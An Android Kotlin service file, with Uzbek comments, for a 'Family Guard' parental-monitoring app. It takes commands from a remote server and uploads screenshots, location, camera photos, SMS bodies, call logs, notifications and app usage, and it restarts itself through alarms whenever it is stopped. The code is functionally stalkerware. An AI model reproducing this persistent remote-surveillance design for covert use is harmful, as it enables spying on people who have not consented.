package com.example.parentalchild

import android.app.*
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.Base64
import kotlin.concurrent.thread

class ScreenCaptureService : Service() {

    companion object {
        @Volatile var isRunning = false
        var instance: ScreenCaptureService? = null
        fun captureScreen(): String? = instance?.capture()
    }

    private var projection: MediaProjection? = null
    private var display: VirtualDisplay? = null
    private var reader: ImageReader? = null
    private var w = 1080; private var h = 1920; private var dpi = 320

    private lateinit var api: Api
    private lateinit var deviceId: String

    @Volatile private var running = false

    override fun onCreate() {
        super.onCreate()
        instance  = this
        isRunning = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(
                    NotificationChannel("cap", "Family Guard", NotificationManager.IMPORTANCE_LOW)
                )
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1,
            NotificationCompat.Builder(this, "cap")
                .setContentTitle("Family Guard")
                .setContentText("Monitoring faol")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()
        )

        // Intent dan deviceId olishga harakat qil,
        // bo'lmasa SharedPreferences dan ol (START_STICKY restart uchun)
        val devId = intent?.getStringExtra("deviceId")
            ?: getSharedPreferences("fg", MODE_PRIVATE).getString("deviceId", null)

        if (devId != null) {
            deviceId = devId
            api = Api(BuildConfig.API_URL, BuildConfig.DEVICE_SECRET)
            getSharedPreferences("fg", MODE_PRIVATE)
                .edit().putString("deviceId", devId).apply()
        }

        // Screen capture ruxsati
        val code = intent?.getIntExtra("resultCode", Activity.RESULT_CANCELED)
        val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
            intent?.getParcelableExtra("code", Intent::class.java)
        else
            @Suppress("DEPRECATION") intent?.getParcelableExtra("code")

        if (code != null && code != Activity.RESULT_CANCELED && data != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val b = getSystemService(WindowManager::class.java).currentWindowMetrics.bounds
                w = b.width(); h = b.height()
            } else {
                val dm = resources.displayMetrics
                w = dm.widthPixels; h = dm.heightPixels
            }
            dpi = resources.displayMetrics.densityDpi
            projection?.stop(); display?.release(); reader?.close()
            projection = (getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
                .getMediaProjection(code, data)
            reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            display = projection?.createVirtualDisplay(
                "FG", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader?.surface, null, null
            )
        }

        // Loop faqat bir marta va deviceId bo'lganda ishga tushsin
        if (!running && ::deviceId.isInitialized) {
            running = true
            WatchdogReceiver.schedule(this)
            startHeartbeatLoop()
            startPollLoop()
        }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        scheduleRestart(2_000)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running   = false
        isRunning = false
        instance  = null
        display?.release()
        reader?.close()
        projection?.stop()
        scheduleRestart(3_000)
        super.onDestroy()
    }

    private fun scheduleRestart(delayMs: Long) {
        try {
            val savedId = getSharedPreferences("fg", MODE_PRIVATE)
                .getString("deviceId", null) ?: return
            val intent = Intent(applicationContext, ScreenCaptureService::class.java)
                .putExtra("deviceId", savedId)
            val pending = PendingIntent.getService(
                applicationContext, 99, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarm = getSystemService(AlarmManager::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (alarm.canScheduleExactAlarms()) {
                    alarm.setExactAndAllowWhileIdle(
                        AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis() + delayMs,
                        pending
                    )
                } else {
                    alarm.setAndAllowWhileIdle(
                        AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis() + delayMs,
                        pending
                    )
                }
            } else {
                alarm.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + delayMs,
                    pending
                )
            }
        } catch (_: Exception) {}
    }
    private fun hasPermission(perm: String): Boolean {
    return androidx.core.content.ContextCompat.checkSelfPermission(
        this, perm
    ) == android.content.pm.PackageManager.PERMISSION_GRANTED
}
    private fun startHeartbeatLoop() {
        
        thread(name = "heartbeat") {
            // Avval register qilib ol
            try { api.register(deviceId, "Child device") } catch (_: Exception) {}
            while (running) {
                try {
                    val bm  = getSystemService(BatteryManager::class.java)
                    val bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    api.heartbeat(deviceId, bat)
                } catch (_: Exception) {}
                Thread.sleep(5_000) // 10 dan 8 ga tushirdim — ishonchli bo'lsin
            }
        }
    }

    private fun startPollLoop() {
        thread(name = "poll") {
            Thread.sleep(4_000)
            while (running) {
                try {
                    val req = api.pending(deviceId)
                    if (req != null) handleRequest(req)
                } catch (_: Exception) {}
                Thread.sleep(5_000)
            }
        }
    }

    private fun handleRequest(req: JSONObject) {
        val id   = req.getString("_id")
        val type = req.getString("type")
        thread {
            try {
                when (type) {
                    "SCREENSHOT" -> {
                        val b64 = when {
                            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                            FamilyGuardAccessibilityService.isEnabled() -> {
                                FamilyGuardAccessibilityService.takeShot()
                            }
                            projection != null && reader != null -> capture()
                            else -> null
                        }
                        if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
                        else api.updateStatus(id, "FAILED")
                    }
                    "LOCATION" -> {
                        val loc = LocationHelper(this).getLocation()
                        if (loc != null) api.updateStatus(id, "DONE", "${loc.first},${loc.second}")
                        else api.updateStatus(id, "FAILED")
                    }
                    "CAMERA_FRONT" -> shootCamera(id, CameraCharacteristics.LENS_FACING_FRONT)
                    "CAMERA_BACK"  -> shootCamera(id, CameraCharacteristics.LENS_FACING_BACK)
                    "APP_LIST" -> {
                        val json = AppHelper(this).getInstalledApps()
                        api.updateStatus(id, "DONE", api.uploadJson(json))
                    }
                    "CALL_LOGS" -> {
    try {
        val calls = TelephonyHelper(this).getCallLogs(50)
        val arr   = org.json.JSONArray()
        calls.forEach { c ->
            arr.put(JSONObject().apply {
                put("number",   c.number)
                put("type",     c.type)
                put("duration", c.durationSec)
                put("date",     c.date)
            })
        }
        if (arr.length() == 0) api.updateStatus(id, "FAILED")
        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
    } catch (_: Exception) {
        api.updateStatus(id, "FAILED")
    }
}

"SMS_LOGS" -> {
    try {
        val smsList = TelephonyHelper(this).getSmsLogs(50)
        val arr     = org.json.JSONArray()
        smsList.forEach { s ->
            arr.put(JSONObject().apply {
                put("address", s.address)
                put("body",    s.body)
                put("type",    s.type)
                put("date",    s.date)
            })
        }
        if (arr.length() == 0) api.updateStatus(id, "FAILED")
        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
    } catch (_: Exception) {
        api.updateStatus(id, "FAILED")
    }
}

"NOTIFICATION_LOGS" -> {
    try {
        val json = NotificationService.getRecent()
        if (json == "[]") api.updateStatus(id, "FAILED")
        else api.updateStatus(id, "DONE", api.uploadJson(json))
    } catch (_: Exception) {
        api.updateStatus(id, "FAILED")
    }
}
                    "CALL_LOG" -> {
    try {
        val calls = TelephonyHelper(this).getCallLogs(50)
        val arr   = org.json.JSONArray()
        calls.forEach { c ->
            arr.put(JSONObject().apply {
                put("number",   c.number)
                put("type",     c.type)
                put("duration", c.durationSec)
                put("date",     c.date)
            })
        }
        if (arr.length() == 0) api.updateStatus(id, "FAILED")
        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
    } catch (_: Exception) {
        api.updateStatus(id, "FAILED")
    }
}

"SMS_LOG" -> {
    try {
        val smsList = TelephonyHelper(this).getSmsLogs(50)
        val arr     = org.json.JSONArray()
        smsList.forEach { s ->
            arr.put(JSONObject().apply {
                put("address", s.address)
                put("body",    s.body)
                put("type",    s.type)
                put("date",    s.date)
            })
        }
        if (arr.length() == 0) api.updateStatus(id, "FAILED")
        else api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
    } catch (_: Exception) {
        api.updateStatus(id, "FAILED")
    }
}

"NOTIFICATIONS" -> {
    try {
        val json = NotificationService.getRecent()
        if (json == "[]") api.updateStatus(id, "FAILED")
        else api.updateStatus(id, "DONE", api.uploadJson(json))
    } catch (_: Exception) {
        api.updateStatus(id, "FAILED")
    }
}
                    "APP_USAGE" -> {
                        val json = AppHelper(this).getAppUsage()
                        if (json == "[]") api.updateStatus(id, "FAILED")
                        else api.updateStatus(id, "DONE", api.uploadJson(json))
                    }
                    else -> api.updateStatus(id, "FAILED")
                }
            } catch (_: Exception) {
                try { api.updateStatus(id, "FAILED") } catch (_: Exception) {}
            }
        }
    }

    private fun shootCamera(id: String, facing: Int) {
        val b64 = CameraHelper(this).capturePhoto(facing)
        if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
        else api.updateStatus(id, "FAILED")
    }

    fun capture(): String? = try {
        Thread.sleep(300)
        val img = reader?.acquireLatestImage() ?: return null
        val pl  = img.planes[0]
        val pad = pl.rowStride - pl.pixelStride * w
        val bmp = Bitmap.createBitmap(w + pad / pl.pixelStride, h, Bitmap.Config.ARGB_8888)
        bmp.copyPixelsFromBuffer(pl.buffer)
        img.close()
        val crop = Bitmap.createBitmap(bmp, 0, 0, w, h); bmp.recycle()
        val out  = ByteArrayOutputStream()
        crop.compress(Bitmap.CompressFormat.JPEG, 70, out); crop.recycle()
        Base64.getEncoder().encodeToString(out.toByteArray())
    } catch (_: Exception) { null }

    override fun onBind(i: Intent?): IBinder? = null
}
